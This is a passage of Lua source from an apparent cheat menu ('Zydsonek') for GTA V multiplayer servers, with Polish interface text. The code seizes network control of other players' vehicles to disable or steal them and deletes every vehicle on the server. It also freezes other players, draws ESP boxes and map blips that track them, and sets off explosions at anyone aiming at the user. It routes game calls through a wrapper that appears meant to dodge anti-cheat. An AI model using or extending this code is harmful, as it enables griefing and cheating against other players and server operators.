        if not ZYD:RequestControlSync(veh) then return ZYD:AddNotification("ERROR", "Failed to get network control in time. Please try again.", 5000) end
        SetVehicleUndriveable(veh, true)
        SetVehicleWheelWidth(veh, 100.0)

        for i = 0, GetVehicleNumberOfWheels(veh) do
            SetVehicleWheelTireColliderSize(veh, i, 100.0)
            SetVehicleWheelSize(veh, i, 100.0)
            SetVehicleWheelTireColliderWidth(veh, i, 100.0)
        end

        SetVehicleEngineTemperature(veh, dict.math.huge + 0.0)
        SetVehicleEngineOn(veh, true, true, true)
        SetVehicleEngineCanDegrade(veh, true)
        ModifyVehicleTopSpeed(veh, 1.0)
        ZYD:AddNotification("Udane", "Pojazd wylaczony.", 5000)
    end

    function ZYD:StealVehicleThread(who, veh, nodrive)
        if not ZYD:GetFunction("DoesEntityExist")(veh) or not ZYD:GetFunction("IsEntityAVehicle")(veh) then return end
        ZYD:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(who, true)
        ZYD:GetFunction("ClearPedTasks")(who)
        local driver = ZYD:GetFunction("GetPedInVehicleSeat")(veh, -1)
        local timeout = 0

        if ZYD:GetFunction("DoesEntityExist")(driver) then
            while ZYD:GetFunction("DoesEntityExist")(veh) and ZYD:GetFunction("GetPedInVehicleSeat")(veh, -1) == driver and timeout <= 25000 do
                ZYD:GetFunction("TaskCombatPed")(who, driver, 0, 16)
                timeout = timeout + 100
                ZYD:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)
                ZYD:GetFunction("SetVehicleDoorsLocked")(veh, 7)

                if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["R"]) then
                    self.Util:DeleteEntity(who)
                    ZYD:AddNotification("INFO", "Kradziez zatrzymana")

                    return false
                end

                Wait(100)
            end

            ZYD:GetFunction("ClearPedTasks")(who)
            ZYD:GetFunction("TaskEnterVehicle")(who, veh, 10000, -1, 2.0, 1, 0)

            while ZYD:GetFunction("DoesEntityExist")(veh) and ZYD:GetFunction("GetPedInVehicleSeat")(veh, -1) ~= who and timeout <= 25000 do
                timeout = timeout + 100
                ZYD:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)
                ZYD:GetFunction("SetVehicleDoorsLocked")(veh, 7)
                ZYD:GetFunction("NetworkRequestControlOfEntity")(veh)

                if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["R"]) then
                    self.Util:DeleteEntity(who)
                    ZYD:AddNotification("INFO", "Kradziez zatrzymana")

                    return false
                end

                Wait(100)
            end
        else
            ZYD:GetFunction("TaskEnterVehicle")(who, veh, 10000, -1, 2.0, 1, 0)

            while ZYD:GetFunction("DoesEntityExist")(veh) and ZYD:GetFunction("GetPedInVehicleSeat")(veh, -1) ~= who and timeout <= 25000 do
                timeout = timeout + 100
                ZYD:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, false)
                ZYD:GetFunction("SetVehicleDoorsLocked")(veh, 7)
                ZYD:GetFunction("NetworkRequestControlOfEntity")(veh)

                if ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["R"]) then
                    self.Util:DeleteEntity(who)
                    ZYD:AddNotification("INFO", "Kradziez zatrzymana")

                    return false
                end

                Wait(100)
            end
        end

        ZYD:GetFunction("ClearPedTasks")(who)
        ZYD:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(who, false)
        ZYD:GetFunction("SetVehicleEngineOn")(veh, true)
        ZYD:GetFunction("NetworkRequestControlOfEntity")(veh)

        if not nodrive then
            for i = 1, 5 do
                ZYD:GetFunction("TaskVehicleDriveWander")(who, veh, 120.0, 0)
            end
        end

        ZYD:GetFunction("SetVehicleDoorsLockedForAllPlayers")(veh, true)
        ZYD:GetFunction("SetVehicleDoorsLocked")(veh, 2)

        return true
    end

    function ZYD:ScrW()
        return self._ScrW
    end

    function ZYD:ScrH()
        return self._ScrH
    end

    local print = _print or print

    function ZYD:Print(...)
        local str = (...)
        if not ZYD.Config.UsePrintMessages then return false end
        print("[Zydsonek] " .. str)

        return true
    end

    function ZYD:GetMousePos()
        return self._MouseX, self._MouseY
    end

    function ZYD:RequestControlOnce(entity)
        if ZYD:GetFunction("NetworkHasControlOfEntity")(entity) then return true end
        ZYD:GetFunction("SetNetworkIdCanMigrate")(ZYD:GetFunction("NetworkGetNetworkIdFromEntity")(entity), true)

        return ZYD:GetFunction("NetworkRequestControlOfEntity")(entity)
    end

    function ZYD:RequestControlSync(veh, timeout)
        timeout = timeout or 2000
        local counter = 0
        self:RequestControlOnce(veh)

        while not ZYD:GetFunction("NetworkHasControlOfEntity")(veh) do
            counter = counter + 100
            Wait(100)
            if counter >= timeout then return false end
        end

        return true
    end

    function ZYD:aG(aH, aI, aJ)
        return coroutine.wrap(function()
            local aK, t = aH()

            if not t or t == 0 then
                aJ(aK)

                return
            end

            local aF = {
                handle = aK,
                destructor = aJ
            }

            setmetatable(aF, aE)
            local aL = true
            repeat
                coroutine.yield(t)
                aL, t = aI(aK)
            until not aL
            aF.destructor, aF.handle = nil, nil
            aJ(aK)
        end)
    end

    function ZYD:EnumerateVehicles()
        return ZYD:aG(ZYD:GetFunction("FindFirstVehicle"), ZYD:GetFunction("FindNextVehicle"), ZYD:GetFunction("EndFindVehicle"))
    end

    function ZYD:EnumeratePeds()
        return ZYD:aG(ZYD:GetFunction("FindFirstPed"), ZYD:GetFunction("FindNextPed"), ZYD:GetFunction("EndFindPed"))
    end

    function ZYD:EnumerateObjects()
        return ZYD:aG(ZYD:GetFunction("FindFirstObject"), ZYD:GetFunction("FindNextObject"), ZYD:GetFunction("EndFindObject"))
    end

    function ZYD:GetClosestVehicle(max_dist)
        local veh, dist = nil, dict.math.huge
        local cur = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)

        for vehicle in self:EnumerateVehicles() do
            local this = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(vehicle, 0.0, 0.0, 0.0)

            if ZYD:GetFunction("DoesEntityExist")(vehicle) then
                local distance = ZYD:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, this.x, this.y, this.z)

                if distance < dist then
                    dist = distance
                    veh = vehicle
                end
            end
        end

        if dist > (max_dist or 10.0) then return end

        return veh, dist
    end

    function ZYD:GetClosestPed(max_dist)
        local ped, dist = nil, dict.math.huge
        local cur = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)

        for pedestrian in self:EnumeratePeds() do
            local this = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(pedestrian, 0.0, 0.0, 0.0)

            if ZYD:GetFunction("DoesEntityExist")(pedestrian) then
                local distance = ZYD:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, this.x, this.y, this.z)

                if distance < dist then
                    dist = distance
                    ped = pedestrian
                end
            end
        end

        if dist > (max_dist or 10.0) then return end

        return ped, dist
    end

    function ZYD:GetClosestObject(max_dist)
        local obj, dist = nil, dict.math.huge
        local cur = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)

        for object in self:EnumeratePeds() do
            local this = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(object, 0.0, 0.0, 0.0)

            if ZYD:GetFunction("DoesEntityExist")(object) then
                local distance = ZYD:GetFunction("GetDistanceBetweenCoords")(cur.x, cur.y, cur.z, this.x, this.y, this.z)

                if distance < dist then
                    dist = distance
                    obj = object
                end
            end
        end

        if dist > (max_dist or 10.0) then return end

        return obj, dist
    end

    function ZYD:DeleteVehicles()
        local _veh = ZYD:GetFunction("IsPedInAnyVehicle") and ZYD:GetFunction("GetVehiclePedIsIn")(ZYD:GetFunction("PlayerPedId")())

        CreateThread(function()
            for veh in ZYD:EnumerateVehicles() do
                if self:RequestControlSync(veh) and (veh ~= _veh or ZYD.Config.OnlineIncludeSelf) then
                    ZYD.Util:DeleteEntity(veh)
                end
            end
        end)
    end

    function ZYD:RepairVehicle(vehicle)
        if vehicle == 0 then return false end
        ZYD:RequestControlOnce(vehicle)
        ZYD:GetFunction("SetVehicleFixed")(vehicle)

        return true
    end

    local was_dragging

    function ZYD:TranslateMouse(wx, wy, ww, wh, drag_id)
        local mx, my = self:GetMousePos()

        if not self.DraggingX and not self.DraggingY then
            self.DraggingX = mx
            self.DraggingY = my
        end

        local mpx = self.DraggingX - wx
        local mpy = self.DraggingY - wy

        if self.DraggingX ~= mx or self.DraggingY ~= my then
            self.DraggingX = mx
            self.DraggingY = my
        end

        local dx = wx - (self.DraggingX - mpx)
        local dy = wy - (self.DraggingY - mpy)

        was_dragging = drag_id

        return wx - dx, wy - dy
    end

    local scroller_y

    function ZYD:TranslateScroller(sy, sh, by)
        local _, my = self:GetMousePos()

        if not scroller_y then
            scroller_y = my
        end

        local mpy = scroller_y - sy

        if scroller_y ~= my then
            scroller_y = my
        end

        return mpy
    end

    local text_cache = {}

    local function _text_width(str, font, scale)
        font = font or 4
        scale = scale or 0.35
        text_cache[font] = text_cache[font] or {}
        text_cache[font][scale] = text_cache[font][scale] or {}
        if text_cache[font][scale][str] then return text_cache[font][scale][str].length end
        ZYD:GetFunction("BeginTextCommandWidth")("STRING")
        ZYD:GetFunction("AddTextComponentSubstringPlayerName")(str)
        ZYD:GetFunction("SetTextFont")(font or 4)
        ZYD:GetFunction("SetTextScale")(scale or 0.35, scale or 0.35)
        local length = ZYD:GetFunction("EndTextCommandGetWidth")(1)

        text_cache[font][scale][str] = {
            length = length
        }

        return length
    end

    function ZYD.Painter:GetTextWidth(str, font, scale)
        return _text_width(str, font, scale) * ZYD:ScrW()
    end

    function ZYD.Painter:DrawText(text, font, centered, x, y, scale, r, g, b, a)
        ZYD:GetFunction("SetTextFont")(font)
        ZYD:GetFunction("SetTextScale")(scale, scale)
        ZYD:GetFunction("SetTextCentre")(centered)
        ZYD:GetFunction("SetTextColour")(r, g, b, a)
        ZYD:GetFunction("BeginTextCommandDisplayText")("STRING")
        ZYD:GetFunction("AddTextComponentSubstringPlayerName")(text)
        ZYD:GetFunction("EndTextCommandDisplayText")(x / ZYD:ScrW(), y / ZYD:ScrH())
    end

    local listing

    local function _lerp(delta, from, to)
        if delta > 1 then return to end
        if delta < 0 then return from end

        return from + (to - from) * delta
    end

    local color_lists = {}

    function ZYD.Painter:ListItem(label, px, py, x, y, w, h, r, g, b, a, id)
        if listing and not ZYD:GetFunction("IsDisabledControlReleased")(0, 24) then
            listing = nil
        end

        if not color_lists[id] then
            color_lists[id] = {
                r = 0,
                g = 0,
                b = 0
            }
        end

        local bool = ZYD.Config.SelectedCategory == id

        if bool then
            color_lists[id].r = _lerp(0.1, color_lists[id].r, ZYD.Tertiary[1])
            color_lists[id].g = _lerp(0.1, color_lists[id].g, ZYD.Tertiary[2])
            color_lists[id].b = _lerp(0.1, color_lists[id].b, ZYD.Tertiary[3])
        else
            color_lists[id].r = _lerp(0.1, color_lists[id].r, 255)
            color_lists[id].g = _lerp(0.1, color_lists[id].g, 255)
            color_lists[id].b = _lerp(0.1, color_lists[id].b, 255)
        end

        self:DrawRect(px + x, py + y, w, h, r, g, b, a)
        self:DrawText(label, 4, true, px + w / 2, py + y - 5, 0.34, dict.math.ceil(color_lists[id].r), dict.math.ceil(color_lists[id].g), dict.math.ceil(color_lists[id].b), 255)

        if self:Holding(px + x, py + y, w, h, id) or ZYD.Config.SelectedCategory == id then
            if not listing and ZYD.Config.SelectedCategory ~= id then
                listing = true

                return true
            else
                return false
            end
        end

        return false
    end

    local selector
    local list_choices = {}

    function ZYD.Painter:DrawSprite(x, y, w, h, heading, dict, name, r, g, b, a, custom)
        if not ZYD:GetFunction("HasStreamedTextureDictLoaded")(dict) and not custom then
            ZYD:GetFunction("RequestStreamedTextureDict")(dict)
        end

        ZYD:GetFunction("DrawSprite")(dict, name, x / ZYD:ScrW(), y / ZYD:ScrH(), w / ZYD:ScrW(), h / ZYD:ScrH(), heading, r, g, b, a)
    end

    local left_active, right_active

    function ZYD.Painter:ListChoice(label, options, px, py, x, y, w, h, r, g, b, a, id, selected, unbind_caller)
        list_choices[id] = list_choices[id] or {
            selected = selected or 1,
            options = options
        }

        local ret
        local lR, lG, lB = 255, 255, 255
        local rR, rG, rB = 255, 255, 255
        self:DrawText(label, 4, false, px + x, py + y, 0.4, 255, 255, 255, 255)
        local width = self:GetTextWidth(label, 4, 0.4)
        local left_x, left_y = px + x + (width - 16.0), py + y + 13

        if self:Holding(left_x + 18 - 9.1, left_y - 5, 38.4, 19.2, 13.5, id .. "_left") then
            if not left_active or left_active == id .. "_left" then
                lR, lG, lB = ZYD.Tertiary[1], ZYD.Tertiary[2], ZYD.Tertiary[3]
            end

            if not left_active then
                left_active = id .. "_left"
                local cur = list_choices[id].selected
                local new = cur - 1

                if not list_choices[id].options[new] then
                    new = #list_choices[id].options
                end

                list_choices[id].selected = new
                ret = true
            end
        elseif left_active == id .. "_left" then
            left_active = nil
        end

        local cur = list_choices[id].options[list_choices[id].selected]

        if not cur then
            cur = "NONE"
        end

        local cur_width = self:GetTextWidth(cur, 4, 0.4)

        if self:Holding(left_x + 18 + cur_width + 16.0 - 9.1, left_y - 5, 19.2, 13.5, id .. "_right") then
            if not right_active or right_active == id .. "_right" then
                rR, rG, rB = ZYD.Tertiary[1], ZYD.Tertiary[2], ZYD.Tertiary[3]
            end

            if not right_active then
                right_active = id .. "_right"
                local cur = list_choices[id].selected
                local new = cur + 1

                if not list_choices[id].options[new] then
                    new = 1
                end

                list_choices[id].selected = new
                ret = true
            end
        elseif right_active == id .. "_right" then
            right_active = nil
        end

        self:DrawText(cur, 4, false, left_x + 27, left_y - 14, 0.4, 255, 255, 255, 255)
        self:DrawSprite(left_x + 18, left_y + 2, 38.4, 27.0, 0.0, "commonmenu", "arrowleft", lR, lG, lB, 255)
        self:DrawSprite(left_x + 18 + cur_width + 16.0, left_y + 2, 38.4, 27.0, 0.0, "commonmenu", "arrowright", rR, rG, rB, 255)

        if self:Hovered(px + x, py + y + 8, width + 27 + cur_width, 10) and unbind_caller and ZYD:GetFunction("IsDisabledControlPressed")(0, ZYD.Keys["MOUSE2"]) and ZYD.Config[unbind_caller] ~= "NONE" then
            ZYD.Config[unbind_caller] = "NONE"
            list_choices[id].selected = -1
            
            ret = false
        end


        return ret
    end

    local checked
    local color_checks = {}

    function ZYD.Painter:CheckBox(label, bool, px, py, x, y, w, h, r, g, b, a, id, centered, size)
        if not ZYD:GetFunction("IsDisabledControlPressed")(0, 24) and checked then
            checked = nil
        end

        if not color_checks[id] then
            color_checks[id] = {
                r = 0,
                g = 0,
                b = 0,
                a = 0
            }
        end

        self:DrawRect(px + x, py + y, 20, 20, 25, 25, 25, 200)

        if bool then
            color_checks[id].r = _lerp(0.1, color_checks[id].r, ZYD.Tertiary[1])
            color_checks[id].g = _lerp(0.1, color_checks[id].g, ZYD.Tertiary[2])
            color_checks[id].b = _lerp(0.1, color_checks[id].b, ZYD.Tertiary[3])
            color_checks[id].a = _lerp(0.1, color_checks[id].a, 200)
        else
            color_checks[id].r = _lerp(0.1, color_checks[id].r, 20)
            color_checks[id].g = _lerp(0.1, color_checks[id].g, 20)
            color_checks[id].b = _lerp(0.1, color_checks[id].b, 20)
            color_checks[id].a = _lerp(0.1, color_checks[id].a, 0)
        end

        self:DrawRect(px + x + 2.5, py + y + 2.5, 15, 15, dict.math.ceil(color_checks[id].r), dict.math.ceil(color_checks[id].g), dict.math.ceil(color_checks[id].b), dict.math.ceil(color_checks[id].a))
        self:DrawText(label, 4, centered, centered and (px + w / 2) or (px + x + 25), py + y - 4, size or 0.37, r, g, b, a)

        if self:Holding(px + x, py + y, w, h, id) then
            if not checked then
                checked = id

                if ZYD.Config.UseSounds then
                    ZYD:GetFunction("PlaySoundFrontend")(-1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", false)
                end

                return true
            else
                return false
            end
        end

        return false
    end

    local activated
	
	function ZYD.Painter:Button(label, px, py, x, y, w, h, r, g, b, a, id, centered, size)
        if not ZYD:GetFunction("IsDisabledControlPressed")(0, 24) and activated then
            activated = nil
        end

        if not w then
            w = self:GetTextWidth(label, 4, size or 0.37)
        end

        if self:Holding(px + x, py + y, w, h, id) then
            self:DrawText(label, 4, centered, centered and (px + w / 2) or (px + x), py + y, size or 0.37, ZYD.Tertiary[1], ZYD.Tertiary[2], ZYD.Tertiary[3], ZYD.Tertiary[4])

            if not activated then
                activated = id

                if ZYD.Config.UseSounds then
                    ZYD:GetFunction("PlaySoundFrontend")(-1, "CLICK_BACK", "WEB_NAVIGATION_SOUNDS_PHONE", false)
                end

                return true
            else
                return false
            end
        end

        self:DrawText(label, 4, centered, centered and (px + w / 2) or (px + x), py + y, size or 0.37, r, g, b, a)

        return false
    end

    function ZYD.Painter:DrawRect(x, y, w, h, r, g, b, a)
        local _w, _h = w / ZYD:ScrW(), h / ZYD:ScrH()
        local _x, _y = x / ZYD:ScrW() + _w / 2, y / ZYD:ScrH() + _h / 2
        ZYD:GetFunction("DrawRect")(_x, _y, _w, _h, r, g, b, a)
    end

    function ZYD.Painter:Hovered(x, y, w, h)
        local mx, my = ZYD:GetMousePos()

        if mx >= x and mx <= x + w and my >= y and my <= y + h then
            return true
        else
            return false
        end
    end

    local holding

    function ZYD.Painter:Holding(x, y, w, h, id)
        if ZYD:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and ZYD:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and ZYD:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then return end
        if holding == id and ZYD:GetFunction("IsDisabledControlPressed")(0, 24) then return true end
        if holding ~= nil and ZYD:GetFunction("IsDisabledControlPressed")(0, 24) then return end

        if self:Hovered(x, y, w, h) and ZYD:GetFunction("IsDisabledControlPressed")(0, 24) then
            holding = id

            return true
        elseif holding == id and not self:Hovered(x, y, w, h) or not ZYD:GetFunction("IsDisabledControlPressed")(0, 24) then
            holding = nil
        end

        return false
    end

    local clicked

    function ZYD.Painter:Clicked(x, y, w, h)
        if clicked then
            if not ZYD:GetFunction("IsDisabledControlPressed")(0, 24) then
                clicked = false
            end

            return false
        end

        if self:Hovered(x, y, w, h) and ZYD:GetFunction("IsDisabledControlJustReleased")(0, 24) then
            clicked = true

            return true
        end

        return false
    end

    function ZYD:Clamp(what, min, max)
        if what < min then
            return min
        elseif what > max then
            return max
        else
            return what
        end
    end

    function ZYD:LimitRenderBounds()
        local cx, cy = self.Config.MenuX, self.Config.MenuY
        cx = self:Clamp(cx, 5, ZYD:ScrW() - self.MenuW - 5)
        cy = self:Clamp(cy, 42, ZYD:ScrH() - self.MenuH - 5)
        local nx, ny = self.Config.NotifX, self.Config.NotifY

        if nx and ny and self.Config.NotifW then
            nx = self:Clamp(nx, 30, ZYD:ScrW() - self.Config.NotifW - 30)
            ny = self:Clamp(ny, 30, ZYD:ScrH() - notifications_h - 30)

            self.Config.NotifX = nx
            self.Config.NotifY = ny
        end

        self.Config.MenuX = cx
        self.Config.MenuY = cy
    end

    function ZYD:AddCategory(title, func)
        self.Categories[#self.Categories + 1] = {
            Title = title,
            Build = func
        }
    end

    function ZYD:SetPedModel(model)
        if not self:RequestModelSync(model) then return self:AddNotification("ERROR", "Couldn't load model ~r~" .. model .. " ~w~in time.") end
        ZYD:GetFunction("SetPlayerModel")(ZYD:GetFunction("PlayerId")(), model)
    end

    function ZYD:GetPedVehicleSeat(ped)
        local vehicle = ZYD:GetFunction("GetVehiclePedIsIn")(ped, false)
        local invehicle = ZYD:GetFunction("IsPedInAnyVehicle")(ped, false)

        if invehicle then
            for i = -2, ZYD:GetFunction("GetVehicleMaxNumberOfPassengers")(vehicle) do
                if (ZYD:GetFunction("GetPedInVehicleSeat")(vehicle, i) == ped) then return i end
            end
        end

        return -2
    end

    function ZYD:GetModelLength(ent)
        local min, max = ZYD:GetFunction("GetModelDimensions")(ZYD:GetFunction("GetEntityModel")(ent))

        return max.y - min.y
    end

    function ZYD:GetModelHeight(ent)
        local min, max = ZYD:GetFunction("GetModelDimensions")(ZYD:GetFunction("GetEntityModel")(ent))

        return max.z - min.z
    end

    function ZYD:Tracker()
        if not self.TrackingPlayer then return end

        if not ZYD:GetFunction("DoesEntityExist")(ZYD:GetFunction("GetPlayerPed")(self.TrackingPlayer)) then
            self.TrackingPlayer = nil

            return
        end

        local coords = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("GetPlayerPed")(self.TrackingPlayer, 0.0, 0.0, 0.0))
        ZYD:GetFunction("SetNewWaypoint")(coords.x, coords.y)
    end

    function ZYD:DoFrozen()
        for src, bool in dict.pairs(frozen_players) do
            src = dict.tonumber(src)
            local ped = ZYD:GetFunction("GetPlayerPed")(src)

            if ZYD:GetFunction("DoesEntityExist")(ped) and bool then
                ZYD:GetFunction("ClearPedTasks")(ped)
                ZYD:GetFunction("ClearPedTasksImmediately")(ped)
                ZYD:GetFunction("DisablePlayerFiring")(src, true)
            end
        end
    end

    local blips = {}

    function ZYD:DoBlips(remove)
        if remove or not ZYD.Config.Player.Blips or not ZYD.Enabled then
            if remove or #blips > 0 then
                for src, blip in dict.pairs(blips) do
                    ZYD:GetFunction("RemoveBlip")(blip)
                    blips[src] = nil
                end
            end

            return
        end

        for src, blip in dict.pairs(blips) do
            if not ZYD:GetFunction("DoesEntityExist")(ZYD:GetFunction("GetPlayerPed")(src)) then
                ZYD:GetFunction("RemoveBlip")(blip)
                blips[src] = nil
            else
                local coords = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("GetPlayerPed")(src, 0.0, 0.0, 0.0))
                local head = ZYD:GetFunction("GetEntityHeading")(ZYD:GetFunction("GetPlayerPed")(src))
                ZYD:GetFunction("SetBlipCoords")(blip, coords.x, coords.y, coords.z)
                ZYD:GetFunction("SetBlipRotation")(blip, dict.math.ceil(head))
                ZYD:GetFunction("SetBlipCategory")(blip, 7)
                ZYD:GetFunction("SetBlipScale")(blip, 0.87)
            end
        end

        for id, src in dict.pairs(ZYD.PlayerCache) do
            src = dict.tonumber(src)

            if ZYD:GetFunction("DoesEntityExist")(ZYD:GetFunction("GetPlayerPed")(src)) and not blips[src] and src ~= PlayerId() then
                local coords = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("GetPlayerPed")(src, 0.0, 0.0, 0.0))
                local head = ZYD:GetFunction("GetEntityHeading")(ZYD:GetFunction("GetPlayerPed")(src))
                local blip = ZYD:GetFunction("AddBlipForCoord")(coords.x, coords.y, coords.z)
                ZYD:GetFunction("SetBlipSprite")(blip, 1)
                ZYD:GetFunction("ShowHeadingIndicatorOnBlip")(blip, true)
                ZYD:GetFunction("SetBlipRotation")(blip, dict.math.ceil(head))
                ZYD:GetFunction("SetBlipScale")(blip, 0.87)
                ZYD:GetFunction("SetBlipCategory")(blip, 7)
                ZYD:GetFunction("BeginTextCommandSetBlipName")("STRING")
                ZYD:GetFunction("AddTextComponentSubstringPlayerName")(ZYD:GetFunction("GetPlayerName")(src))
                ZYD:GetFunction("EndTextCommandSetBlipName")(blip)
                blips[src] = blip
            end
        end
    end

    function ZYD:DoAntiAim()
        if not self.Config.Player.AntiAim then return end

        for id, src in dict.pairs(ZYD.PlayerCache) do
            src = dict.tonumber(src)
            local ped = ZYD:GetFunction("GetPlayerPed")(src)
            local ret, ent = ZYD:GetFunction("GetEntityPlayerIsFreeAimingAt")(src)

            if ret and ent == ZYD:GetFunction("PlayerPedId")() then
                local pos = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
                ZYD:GetFunction("AddExplosion")(pos.x, pos.y, pos.z, 18, 1.0, false, true, 10.0)
            end
        end
    end

    function ZYD:TeleportToWaypoint()
        local waypoint = ZYD:GetFunction("GetFirstBlipInfoId")(8)
        if not DoesBlipExist(waypoint) then return ZYD:AddNotification("ERROR", "Brak zaznaczonego gps!", 5000) end
        local coords = ZYD:GetFunction("GetBlipInfoIdCoord")(waypoint)

        CreateThread(function()
            for height = 100, -100, -5 do
                ZYD:GetFunction("SetPedCoordsKeepVehicle")(ZYD:GetFunction("PlayerPedId")(), coords.x, coords.y, height + 0.0)
                local foundGround, zPos = ZYD:GetFunction("GetGroundZFor_3dCoord")(coords.x, coords.y, height + 0.0)

                if foundGround then
                    ZYD:GetFunction("SetPedCoordsKeepVehicle")(ZYD:GetFunction("PlayerPedId")(), coords.x, coords.y, zPos + 0.0)
                    break
                end

                Wait(5)
            end

            ZYD:AddNotification("SUCCESS", "Przeteleportowano do znacznika")
        end)
    end

    local esp_talk_col = ZYD.Tertiary

    function ZYD:DoESP()
        if not self.Config.Player.ESP then return end
        local spot = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)

        if self.FreeCam and self.FreeCam.On and camX and camY and camZ then
            spot = vector3(camX, camY, camZ)
        elseif self.SpectatingPlayer and ZYD:GetFunction("DoesEntityExist")(ZYD:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then
            spot = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ZYD:GetFunction("GetPlayerPed")(self.SpectatingPlayer, 0.0, 0.0, 0.0))
        elseif self.RCCam and self.RCCam.On and rc_camX and rc_camY and rc_camZ then
            spot = vector3(rc_camX, rc_camY, rc_camZ)
        end

        for id, src in dict.pairs(ZYD.PlayerCache) do
            src = dict.tonumber(src)
            local ped = ZYD:GetFunction("GetPlayerPed")(src)

            if ZYD:GetFunction("DoesEntityExist")(ped) and ped ~= ZYD:GetFunction("PlayerPedId")() then
                local _id = dict.tonumber(ZYD:GetFunction("GetPlayerServerId")(src))
                local coords = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector_origin.x, vector_origin.y, vector_origin.z)
                local dist = ZYD:GetFunction("GetDistanceBetweenCoords")(spot.x, spot.y, spot.z, coords.x, coords.y, coords.z)
                local seat = dict.tonumber(ZYD:GetPedVehicleSeat(ped))

                if seat ~= -2 then
                    seat = seat + 0.25
                end

                if dist <= ZYD.Config.Player.ESPDistance then
                    local pos_z = coords.z + 1.2

                    if seat ~= -2 then
                        pos_z = pos_z + seat
                    end

                    local _on_screen, _, _ = ZYD:GetFunction("GetScreenCoordFromWorldCoord")(coords.x, coords.y, pos_z)

                    if _on_screen then
                        if self.Config.Player.Box then
                            self:DoBoxESP(src, ped)
                        end

                        if ZYD:GetFunction("NetworkIsPlayerTalking")(src) then
                            self:Draw3DText(coords.x, coords.y, pos_z, _id .. " | " .. ZYD:CleanName(ZYD:GetFunction("GetPlayerName")(src), true) .. " [" .. dict.math.ceil(dist) .. "M" .. "]", esp_talk_col[1], esp_talk_col[2], esp_talk_col[3])
                        else
                            self:Draw3DText(coords.x, coords.y, pos_z, _id .. " | " .. ZYD:CleanName(ZYD:GetFunction("GetPlayerName")(src), true) .. " [" .. dict.math.ceil(dist) .. "M" .. "]", 255, 255, 255)
                        end
                    end
                end
            end
        end
    end

    function ZYD:DoBoxESP(src, ped)
        local r, g, b, a = 255, 255, 255, 255

        if ZYD:GetFunction("NetworkIsPlayerTalking")(src) then
            r, g, b = esp_talk_col[1], esp_talk_col[2], esp_talk_col[3]
        end

        local model = ZYD:GetFunction("GetEntityModel")(ped)
        local min, max = ZYD:GetFunction("GetModelDimensions")(model)
        local top_front_right = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, max)
        local top_back_right = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(max.x, min.y, max.z))
        local bottom_front_right = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(max.x, max.y, min.z))
        local bottom_back_right = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(max.x, min.y, min.z))
        local top_front_left = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(min.x, max.y, max.z))
        local top_back_left = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(min.x, min.y, max.z))
        local bottom_front_left = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, vector3(min.x, max.y, min.z))
        local bottom_back_left = ZYD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, min)
        -- LINES
        -- RIGHT SIDE
        ZYD:GetFunction("DrawLine")(top_front_right, top_back_right, r, g, b, a)
        ZYD:GetFunction("DrawLine")(top_front_right, bottom_front_right, r, g, b, a)
        ZYD:GetFunction("DrawLine")(bottom_front_right, bottom_back_right, r, g, b, a)
        ZYD:GetFunction("DrawLine")(top_back_right, bottom_back_right, r, g, b, a)
        -- LEFT SIDE
        ZYD:GetFunction("DrawLine")(top_front_left, top_back_left, r, g, b, a)
        ZYD:GetFunction("DrawLine")(top_back_left, bottom_back_left, r, g, b, a)
        ZYD:GetFunction("DrawLine")(top_front_left, bottom_front_left, r, g, b, a)
        ZYD:GetFunction("DrawLine")(bottom_front_left, bottom_back_left, r, g, b, a)
        -- Connection
        ZYD:GetFunction("DrawLine")(top_front_right, top_front_left, r, g, b, a)
        ZYD:GetFunction("DrawLine")(top_back_right, top_back_left, r, g, b, a)
        ZYD:GetFunction("DrawLine")(bottom_front_left, bottom_front_right, r, g, b, a)
        ZYD:GetFunction("DrawLine")(bottom_back_left, bottom_back_right, r, g, b, a)
    end

    ZYD:AddCategory("~g~Gracz", function(self, x, y, w, h)
        local curY = 5

        if self.Painter:CheckBox("~g~Nieśmiertelność", self.Config.Player.God, x, y, 5, curY, 200, 20, 255, 255, 255, 255, "god_enabled") then
            if ZYD.Config.SafeMode then
